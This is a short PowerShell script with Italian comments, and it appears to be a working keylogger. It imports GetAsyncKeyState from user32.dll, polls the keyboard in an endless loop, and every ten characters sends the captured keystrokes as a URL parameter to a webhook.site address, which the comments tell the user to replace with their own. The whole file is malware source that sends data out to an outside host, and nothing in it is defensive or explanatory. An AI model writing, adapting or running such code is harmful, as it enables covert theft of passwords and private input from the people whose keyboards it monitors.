function UrlEncode {
    param([string]$value)
    $encoded = [System.Uri]::EscapeDataString($value)
    return $encoded
}

$webhook = "https://webhook.site/fbea19fd-c6a4-4fe7-b371-c0066a01848e/"  # Sostituisci con il tuo Webhook
$log = ""

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@

while ($true) {
    Start-Sleep -Milliseconds 50
    for ($ascii = 8; $ascii -le 255; $ascii++) {
        if ([Keyboard]::GetAsyncKeyState($ascii) -ne 0) {
            $key = [char]$ascii
            $log += $key
            if ($log.Length -ge 10) {  # Invia i dati ogni 10 caratteri
                $encodedLog = UrlEncode $log
                $url = "$webhook?keys=$encodedLog"
                Invoke-WebRequest -Uri $url -Method GET
                $log = ""
            }
        }
    }
}
